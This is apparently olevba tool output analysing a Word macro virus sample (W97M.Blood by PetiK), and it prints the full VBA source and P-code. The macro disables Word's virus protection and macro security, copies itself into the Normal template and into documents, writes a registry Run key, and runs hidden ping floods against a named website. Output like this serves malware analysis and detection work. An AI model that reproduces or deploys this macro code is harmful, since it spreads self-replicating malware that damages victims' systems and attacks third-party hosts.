olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Petik
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Petik - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Blood.bas 
in file: Virus.MSWord.Petik - OLE stream: 'Macros/VBA/Blood'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&

WordBasic.DisableAutoMacros 0
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
win = Environ("windir")
DropFile = win & "\blood.sys"
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") <> "OK" Then
    Doc("Blood").Export DropFile
    Nor.Import DropFile
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") = "OK"
End If
If Doc.Item("Blood").Name <> "Blood" Then
    Nor("Blood").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If

If Day(Now) = 15 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "BloodMan"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "PetiK Corporation"
End If

End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "W97M.Blood.A coded by PetiK (c)2001"
    .Heading = "W97M.Blood"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End Sub

Sub ViewVBCode()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "Blood1") = "rundll32 mouse,disable"
MsgBox "Your computer is dead." + vbCr + "Don't stop your machine", vbCritical, "W97M.Blood"
ShowVisualBasicEditor = True
End Sub

Sub AutoClose()
MsgBox "PetiK vous souhaite une très bonne journée", vbExclamation, "W97M.Blood"
Call PetiK
Call Attak
End Sub

Sub PetiK()
On Error Resume Next
win = Environ("windir")
FileSystem.MkDir win & "\Blood"
Open win & "\Blood\TitleBlood.txt" For Output As #1
Print #1, "For the new Macro Virus W97M.Blood by PetiK"
Print #1, ""
Print #1, "Hi " & Application.UserName & ","
Print #1, "How do you do ?"
Print #1, "Your computer is infected by Blood"
Print #1, "It's not a dangerous macro."
Print #1, "         Bye.    PetiK"
Close #1
FileSystem.SetAttr win & "\Blood\TitleBlood.txt", vbReadOnly
End Sub

Sub Attak()
Shell "ping -l 5000 -t www.front-national.fr", vbHide
Shell "ping -l 5000 -t front-national.fr", vbHide
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Petik
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1308 bytes
' Macros/VBA/Blood - 8351 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #3:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #4:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #6:
' 	EndWith 
' Line #7:
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #10:
' Line #11:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #12:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Nor 
' Line #13:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Doc 
' Line #14:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St win 
' Line #15:
' 	Ld win 
' 	LitStr 0x000A "\blood.sys"
' 	Concat 
' 	St DropFile 
' Line #16:
' 	LitStr 0x0000 ""
' 	LitStr 0x0034 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\"
' 	LitStr 0x0009 "InfectDot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0002 "OK"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld DropFile 
' 	LitStr 0x0005 "Blood"
' 	ArgsLd Doc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #18:
' 	Ld DropFile 
' 	Ld Nor 
' 	ArgsMemCall Import 0x0001 
' Line #19:
' 	LitStr 0x0002 "OK"
' 	LitStr 0x0000 ""
' 	LitStr 0x0034 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\"
' 	LitStr 0x0009 "InfectDot"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitStr 0x0005 "Blood"
' 	Ld Doc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Name 
' 	LitStr 0x0005 "Blood"
' 	Ne 
' 	IfBlock 
' Line #22:
' 	Ld DropFile 
' 	LitStr 0x0005 "Blood"
' 	ArgsLd Nor 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld DropFile 
' 	Ld Doc 
' 	ArgsMemCall Import 0x0001 
' Line #24:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Ld Shell 
' 	ArgsLd Now 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0008 "BloodMan"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #29:
' 	LitStr 0x0011 "PetiK Corporation"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Sub HelpAbout())
' Line #35:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Assistant 
' 	With 
' Line #36:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #37:
' 	EndWith 
' Line #38:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #39:
' 	LitStr 0x0023 "W97M.Blood.A coded by PetiK (c)2001"
' 	MemStWith Text 
' Line #40:
' 	LitStr 0x000A "W97M.Blood"
' 	MemStWith Heading 
' Line #41:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #42:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #43:
' 	ArgsMemCallWith Show 0x0000 
' Line #44:
' 	EndWith 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Sub Sy())
' Line #48:
' 	LitStr 0x0016 "rundll32 mouse,disable"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
' 	LitStr 0x0006 "Blood1"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #49:
' 	LitStr 0x0016 "Your computer is dead."
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x0017 "Don't stop your machine"
' 	Add 
' 	Ld ShowVisualBasicEditor 
' 	LitStr 0x000A "W97M.Blood"
' 	ArgsCall MsgBox 0x0003 
' Line #50:
' 	LitVarSpecial (True)
' 	St id_02E2 
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Sub AutoClose())
' Line #54:
' 	LitStr 0x002A "PetiK vous souhaite une très bonne journée"
' 	Ld vbExclamation 
' 	LitStr 0x000A "W97M.Blood"
' 	ArgsCall MsgBox 0x0003 
' Line #55:
' 	ArgsCall (Call) PetiK 0x0000 
' Line #56:
' 	ArgsCall (Call) vbHide 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub PetiK())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St win 
' Line #62:
' 	Ld win 
' 	LitStr 0x0006 "\Blood"
' 	Concat 
' 	Ld MkDir 
' 	ArgsMemCall FileCopy 0x0001 
' Line #63:
' 	Ld win 
' 	LitStr 0x0015 "\Blood\TitleBlood.txt"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "For the new Macro Virus W97M.Blood by PetiK"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Hi "
' 	Ld Application 
' 	MemLd Day 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "How do you do ?"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "Your computer is infected by Blood"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "It's not a dangerous macro."
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "         Bye.    PetiK"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #72:
' 	Ld win 
' 	LitStr 0x0015 "\Blood\TitleBlood.txt"
' 	Concat 
' 	Ld _B_var_Open 
' 	Ld MkDir 
' 	ArgsMemCall vbReadOnly 0x0002 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Sub vbHide())
' Line #76:
' 	LitStr 0x0025 "ping -l 5000 -t www.front-national.fr"
' 	Ld ViewVBCode 
' 	ArgsCall Spread 0x0002 
' Line #77:
' 	LitStr 0x0021 "ping -l 5000 -t front-national.fr"
' 	Ld ViewVBCode 
' 	ArgsCall Spread 0x0002 
' Line #78:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

